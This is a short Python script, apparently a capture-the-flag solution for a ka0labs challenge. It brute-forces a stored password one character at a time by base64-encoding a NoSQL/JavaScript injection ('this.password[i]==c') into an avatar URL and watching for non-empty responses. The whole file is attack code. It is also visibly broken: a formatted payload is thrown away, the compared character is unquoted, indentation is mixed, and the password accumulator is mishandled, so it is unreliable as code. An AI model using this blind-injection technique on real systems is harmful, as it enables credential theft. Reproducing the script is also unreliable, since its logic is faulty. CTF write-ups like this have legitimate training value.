import requests
import base64

direccion = "http://challenges.ka0labs.org:31337/avatar/{}"
injection = '"/**/||/**/{}/**/||/**/"'
password = ''
found = False
def force_letter(i):
    j = 0
    global found
    while ((j < 128) and not found):
        code = 'this.password[{}]=={}'.format(i,chr(j))
        injection.format(code)
        encoded_injection = base64.b64encode(injection)
        r = requests.get(direccion.format(encoded_injection))
	print (r.status_code)        
	if (r.text):
            found = True
        else:
            j+=1
	    found = False
    return j

def main():
	j = 0
 	i = 0
	while(j < 128):
		j = force_letter(i)
		i+=1
		j+=1
		print chr(j)
	password += chr(j)


print password

main()
